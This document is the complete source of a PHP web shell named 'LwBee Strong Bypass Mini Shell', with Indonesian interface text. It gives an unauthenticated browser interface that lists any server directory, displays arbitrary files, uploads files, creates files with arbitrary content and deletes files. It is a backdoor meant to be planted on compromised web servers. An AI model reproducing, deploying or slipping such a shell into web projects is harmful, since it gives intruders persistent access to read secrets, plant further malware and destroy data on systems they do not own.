<?php
function scanDirectory($path) {
    $items = [];
    if (is_dir($path)) {
        $scan = scandir($path);
        foreach ($scan as $item) {
            if ($item !== '.' && $item !== '..') {
                $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                $items[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'directory' : 'file'
                ];
            }
        }
    }
    usort($items, function($a, $b) {
        if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
        if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function generateBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $breadcrumb = [];
    $currentPath = '';
    foreach ($parts as $part) {
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = '<a href="?path=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode(' / ', $breadcrumb);
}

$defaultRootPath = getcwd();
$rootPath = $_GET['path'] ?? $defaultRootPath;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (file_exists($deletePath)) {
        unlink($deletePath);
        echo "<div class='alert alert-success'>File berhasil dihapus: <strong>" . htmlspecialchars($deletePath) . "</strong></div>";
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak dapat dihapus.</div>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
    $path = $_POST['path'] ?? $rootPath;
    $filename = $_POST['filename'] ?? '';
    $content = $_POST['content'] ?? '';
    
    if (!empty($path) && !empty($filename)) {
        $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
        file_put_contents($filePath, $content);
        echo "<div class='alert alert-success'>File berhasil dibuat di: <strong>" . htmlspecialchars($filePath) . "</strong></div>";
    } else {
        echo "<div class='alert alert-danger'>Path dan nama file tidak boleh kosong.</div>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_upload'])) {
    $uploadPath = $_POST['upload_path'] ?? $rootPath;
    
    if (!empty($uploadPath) && is_dir($uploadPath)) {
        $fileName = basename($_FILES['file_upload']['name']);
        $targetFile = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
        
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetFile)) {
            echo "<div class='alert alert-success'>File berhasil diunggah ke: <strong>" . htmlspecialchars($targetFile) . "</strong></div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal mengunggah file.</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Path tidak valid atau tidak ditemukan.</div>";
    }
}

if (isset($_GET['view_file'])) {
    $filePath = $_GET['view_file'];
    if (file_exists($filePath) && is_file($filePath)) {
        $fileContent = htmlspecialchars(file_get_contents($filePath));
        echo "<div class='alert alert-info'><strong>" . htmlspecialchars($filePath) . "</strong></div>";
        echo "<pre class='file-content'>$fileContent</pre>";
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak dapat dibuka.</div>";
    }
}

$scannedItems = scanDirectory($rootPath);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@LwBee Strong Bypass</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0 20px;
        }

        h2 {
            color: #333;
            text-align: center;
        }

        .alert {
            padding: 20px;
            margin-bottom: 15px;
            border-radius: 5px;
            text-align: center;
        }

        .alert-success {
            background-color: #d4edda;
            color: #155724;
        }

        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
        }

        .breadcrumb a {
            color: #007bff;
            text-decoration: none;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        .file-list li {
            list-style: none;
            background: #fff;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        button {
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        input[type="file"], input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
		textarea {
            resize: none;
            height: 100px;
        }

        .form-upload, .form-create, .form-manager, .header, .footer {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        ul.file-list {
            padding: 0;
        }
		.file-info {
            display: flex;
            align-items: center;
            flex: 1;
        }
        .file-info strong {
            margin-right: 10px;
        }
		.file-content {
			background-color: #fff;
			padding: 20px;
			border-radius: 5px;
			white-space: pre-wrap; /* Membungkus teks di dalam konten file */
			border: 1px solid #ddd;
			font-family: 'Courier New', Courier, monospace;
			font-size: 14px;
			max-height: 400px; 
			overflow-y: auto; /* Scroll jika konten terlalu panjang */
			color: #333;
}
    </style>
</head>
<body>
<div class="header">
<h2>LwBee Strong Bypass Mini Shell</h2>
</div>

<div class="form-upload">
    <h3>Upload File</h3>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file_upload" required>
        <input type="hidden" name="upload_path" value="<?php echo htmlspecialchars($rootPath); ?>">
        <button type="submit">Upload File</button>
    </form>
</div>

<div class="form-create">
    <h3>Create New File</h3>
    <form action="" method="post">
        <input type="text" name="path" placeholder="Path" value="<?php echo htmlspecialchars($rootPath); ?>" required>
        <input type="text" name="filename" placeholder="Filename" required>
        <textarea name="content" placeholder="File content"></textarea>
        <button type="submit">Create File</button>
    </form>
</div>

<div class="form-manager">
<ul class="file-list">
<div class="breadcrumb">
    <h3>Path: <?php echo generateBreadcrumb($rootPath); ?></h3>
	<hr>
</div>
    <?php foreach ($scannedItems as $item): ?>
        <li>
		<div class="file-info">
            <strong><?php echo $item['type'] === 'directory' ? '[Dir]' : '[File]'; ?></strong>
            <?php if ($item['type'] === 'directory'): ?>
                <a href="?path=<?php echo urlencode($item['path']); ?>"> <?php echo htmlspecialchars($item['name']); ?></a>
            <?php else: ?>
                <a href="?path=<?php echo urlencode($rootPath); ?>&view_file=<?php echo urlencode($item['path']); ?>"> <?php echo htmlspecialchars($item['name']); ?></a>
            <?php endif; ?>
            <?php if ($item['type'] === 'file'): ?>
		</div>
                <form action="" method="post" style="display: inline;">
                    <input type="hidden" name="delete_path" value="<?php echo htmlspecialchars($item['path']); ?>">
                    <button type="submit">Hapus</button>
                </form>
            <?php endif; ?>
        </li>
    <?php endforeach; ?>
</ul>
</div>
<div class="footer">
<h4 style="text-align: center;">LwBee Bypass ©️ 2024
</div>
</body>
</html>